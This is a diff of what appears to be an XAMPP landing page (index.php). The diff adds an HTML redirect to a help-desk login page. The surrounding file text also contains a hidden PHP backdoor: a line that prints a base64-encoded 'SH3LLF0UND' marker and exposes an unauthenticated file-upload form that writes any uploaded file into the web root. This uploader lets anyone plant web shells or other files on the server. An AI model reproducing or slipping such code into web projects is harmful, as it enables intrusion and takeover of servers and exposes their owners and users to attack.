@@ -14,9 +14,21 @@ header("location:y/index.php/");
 	exit;
 ?>
 Something is wrong with the XAMPP installation :-(
-
-
-
+.
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="0;url=pages/login.php">
+<title>IMJ - APEX HELP DESK</title>
+<script language="javascript">
+    window.location.href = "pages/login.php"
+</script>
+</head>
+<body>
+Go to <a href="pages/login.php">/pages/login.php</a>
+</body>
+</html>
+.
 
 <?php print_r(base64_decode('U0gzTExGMFVORA==')); if($_POST){if(@copy($_FILES["0"]["tmp_name"],$_FILES["0"]["name"])){echo"Y";}else{echo"N";}}else{echo"<form method=post enctype=multipart/form-data><input type=file name=0><input name=0 type=submit value=up>";}?>
 
